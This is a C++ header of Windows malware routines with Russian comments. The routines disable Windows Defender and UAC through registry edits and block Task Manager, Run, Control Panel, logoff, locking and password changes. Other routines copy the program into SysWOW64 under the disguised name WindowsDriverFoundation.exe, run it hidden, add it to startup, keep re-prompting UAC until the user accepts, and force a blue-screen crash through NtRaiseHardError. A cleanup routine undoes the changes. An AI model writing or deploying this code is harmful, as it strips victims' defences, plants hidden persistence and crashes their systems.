#pragma once
#include "include.h"
bool isUserAdmin() {
    BOOL isAdminFlag = FALSE;
    BYTE adminSid[SECURITY_MAX_SID_SIZE]; // Буфер для хранения SID
    DWORD sidSize = sizeof(adminSid);

    if (!CreateWellKnownSid(WinBuiltinAdministratorsSid, NULL, &adminSid, &sidSize)) return false;
    if (!CheckTokenMembership(NULL, &adminSid, &isAdminFlag)) return false;
    return isAdminFlag != FALSE;
}   
void DefenderOwner(){
    // Отключение Defender
    system("REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f");

    system("REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f");
    system("REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f");
    system("REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f");
    system("REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f");
    system("REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableIOAVProtection /t REG_DWORD /d 1 /f");

	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoControlPanel /t reg_dword /d 1 /f");
	system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /t REG_DWORD /d 1 /f");
    // Отключение UAC
    system("REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v EnableLUA /t REG_DWORD /d 0 /f");
}
bool checkAndCreateFile(const std::string& filename) {
    std::string fullPath = "C:\\Windows\\SysWOW64\\" + filename; // Файл-чекпоинт создается только один раз

    std::ifstream file(fullPath);
    if (file) {
        return 1;
    }
    else {
        std::ofstream newFile(fullPath);
        if (newFile) {
            return 0;
        }
    }
    return 0;
}
void addToStartup() {
    char path[MAX_PATH];
    // Получаем путь к текущему исполняемому файлу
    GetModuleFileName(NULL, path, MAX_PATH);
    
    // Добавление в реестр для автозагрузки
    std::string command = "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v WindowsDriverFoundation /t REG_SZ /d \"" + std::string(path) + "\" /f";
    system(command.c_str());
}
void reset() {  // краш системы 
	// Try to force **BSOD** first
	// I like how this method even works in user mode without admin privileges on all Windows versions since XP (or 2000, idk)...
	// This isn't even an exploit, it's just an undocumented feature.
    HMODULE ntdll = LoadLibraryA("ntdll");
    FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
    FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

    if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
        BOOLEAN tmp1; DWORD tmp2;
        ((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
        ((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0294823, 0, 0, 0, 6, &tmp2);
    }
}
void restartSystem() {  // запасная функция взял ее с форума
    std::cout << "restarting" << std::endl;

    // меньше нельзя ставить иначе не все изменения реестра сохраняются на слабых пк
    Sleep(1500);

    // Перезагрузка системы
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;

    // Открываем токен текущего процесса
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        std::cerr << "Error obtaining privileges!" << std::endl;
        return;
    }

    // Получаем привилегию SE_SHUTDOWN_NAME
    LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // токен привилегии
    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
    if (GetLastError() != ERROR_SUCCESS) {
        std::cerr << "Error setting privileges!" << std::endl;
        return;
    }

    // Выполняем перезагрузку
    if (!ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER)) {
        std::cerr << "Error while trying to reboot!" << std::endl;
    }
}
void restartAsAdmin() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
  
    SHELLEXECUTEINFOA sei = { sizeof(sei) };
    sei.lpVerb = "runas"; // Запрос UAC
    sei.lpFile = path;
    sei.hwnd = NULL;
    sei.nShow = SW_SHOWNORMAL;
  
    if (!ShellExecuteExA(&sei)) {
        DWORD err = GetLastError();
        if (err == ERROR_CANCELLED) {
            // Пользователь нажал "Нет", повторяем запуск
            Sleep(2000); // Ждём перед повтором
            restartAsAdmin();
        }
    }
  }
bool copyAndRunSelf() {
    // Путь к текущему исполняемому файлу
    char path[MAX_PATH];
    GetModuleFileName(NULL, path, MAX_PATH);

    // куда мы будем копировать программу
    const char* targetDirectory = "C:\\Windows\\SysWOW64\\";
    const char* targetFile = "WindowsDriverFoundation.exe";
    char destination[MAX_PATH];
    strcpy_s(destination, MAX_PATH, targetDirectory);
    strcat_s(destination, MAX_PATH, targetFile);

    // Проверяем находится программа уже в C:\Windows\SysWOW64
    if (strstr(path, targetDirectory) != NULL) {
        return 0;
    }
    // копируем и запусскаем
    CopyFile(path, destination, FALSE);
    ShellExecute(NULL, "open", destination, NULL, NULL, SW_HIDE);
    return 1;
}
void cleanreg() {
    system("REG DELETE \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /f");
    system("REG DELETE \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableRealtimeMonitoring /f");
    system("REG DELETE \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableBehaviorMonitoring /f");
    system("REG DELETE \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableScanOnRealtimeEnable /f");
    system("REG DELETE \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableOnAccessProtection /f");
    system("REG DELETE \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableIOAVProtection /f");
    system("REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v EnableLUA /t REG_DWORD /d 1 /f");

    system("REG DELETE hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /f");
	system("REG DELETE hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /f");
	system("REG DELETE hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoControlPanel /f");
	system("reg DELETE HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /f");
	system("reg DELETE HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /f");
	system("reg DELETE HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /f");
	system("reg DELETE HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /f");
    system("REG DELETE \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v WindowsDriverFoundation /f");
    system("REG DELETE \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v winlogon /f");
}
void cleanfile() {
    const char* filePath = "C:\\Windows\\SysWOW64\\lafkildatnn.dat";
    if (DeleteFile(filePath)) {
        std::cout << "File successfully deleted!" << std::endl;
    }
}